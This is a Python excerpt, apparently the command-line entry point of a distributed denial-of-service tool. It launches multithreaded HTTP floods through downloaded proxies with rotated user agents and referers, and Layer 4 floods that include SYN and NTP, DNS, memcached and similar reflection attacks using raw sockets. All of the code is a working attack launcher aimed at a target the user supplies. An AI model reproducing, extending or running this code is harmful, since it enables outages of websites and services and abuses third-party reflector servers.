        with suppress(KeyboardInterrupt):
            with suppress(IndexError):
                one = argv[1].upper()

                if one == "HELP": raise IndexError()
                if one == "TOOLS": ToolsConsole.runConsole()
                if one == "STOP": ToolsConsole.stop()

                method = one
                event = Event()

                if method in Methods.LAYER7_METHODS:
                    url = URL(argv[2].strip())
                    threads = int(argv[4])
                    timer = int(argv[7])
                    mgbit = int(argv[6])
                    proxy_ty = int(argv[3].strip())
                    proxy_li = Path(currentDir / "files/proxies/" / argv[5].strip())
                    useragent_li = Path(currentDir / "files/useragent.txt")
                    referers_li = Path(currentDir / "files/referers.txt")
                    proxies: Any = set()

                    if not useragent_li.exists(): exit("The Useragent file doesn't exist ")
                    if not referers_li.exists(): exit("The Referer file doesn't exist ")

                    uagents = set(a.strip() for a in useragent_li.open("r+").readlines())
                    referers = set(a.strip() for a in referers_li.open("r+").readlines())

                    if not uagents: exit("Empty Useragent File ")
                    if not referers: exit("Empty Referer File ")

                    if proxy_ty not in {4, 5, 1}: exit("Socks Type Not Found [4, 5, 1]")
                    if threads > 1000: print("WARNING! thread is higher than 1000")

                    if not proxy_li.exists():
                        proxy_li.parent.mkdir(parents=True, exist_ok=True)
                        with proxy_li.open("w") as wr:
                            Proxies: Set[Proxy] = ProxyManager.DownloadFromConfig(con, proxy_ty)
                            Proxies = ProxyManager.checkAll(Proxies, "https://httpbin.org/get", 1, threads)
                            if not Proxies:
                                exit("Proxy Check failed, Your network may be the problem | The target may not be available.")
                            stringBuilder = ""
                            for proxy in Proxies:
                                stringBuilder += (proxy.__str__() + "\n")
                            wr.write(stringBuilder)

                    with proxy_li.open("r+") as rr:
                        for pro in Regex.IPPort.findall(rr.read()):
                            proxies.add(Proxy(pro[0], int(pro[1]), proxy_ty))

                    if not proxies:
                        print("Empty Proxy File, Running flood witout proxy")
                        proxies = None
                    if proxies:
                        print(f"Proxy Count: {len(proxies):,}" )

                    bytesPerThread = (mgbit * 125000) / threads
                    bytesPerSecond = (bytesPerThread / timer) + 1

                    print(mgbit)
                    print(threads)
                    print(bytesPerSecond)
                    print(bytesPerThread)
                    for _ in range(threads):
                        HttpFlood(url, method, bytesPerSecond, event, uagents, referers, proxy_ty, proxies).start()

                if method in Methods.LAYER4_METHODS:
                    target = argv[2].strip()
                    if ":" in target and not target.split(":")[1].isnumeric(): exit("Invalid Port Number")
                    port = 53 if ":" not in target else int(target.split(":")[1])
                    threads = int(argv[3])
                    timer = int(argv[4])
                    mgbit = int(argv[5])
                    ref = None

                    if ":" not in target:
                        print("WARNING! Port Not Selected, Set To Default: 80")
                    else:
                        target = target.split(":")[0]

                    if 65535 < port or port < 1: exit("Invalid Port [Min: 1 / Max: 65535] ")
                    if not Regex.IP.match(target): exit("Invalid Ip Selected")

                    if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "ARD", "SYN"} and \
                            not ToolsConsole.checkRawSocket(): exit("Cannot Create Raw Socket ")

                    if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "ARD"}:
                        if len(argv) == 7:
                            refl_li = Path(currentDir / "files" / argv[6].strip())
                            if not refl_li.exists(): exit("The Reflector file doesn't exist ")
                            ref = set(a.strip() for a in Regex.IP.findall(refl_li.open("r+").read()))
                        if not ref: exit("Empty Reflector File ")

                    bytesPerThread = (mgbit * 125000) / threads
                    bytesPerSecond = (bytesPerThread / timer) + 1


                    for _ in range(threads):
                        Layer4((target, port), ref, method, event, bytesPerSecond).start()

                sleep(5)
                print("Attack Started !")
                event.set()

                while timer:
                    timer -= 1
                    sleep(1)

                event.clear()
                exit()
            ToolsConsole.usage()
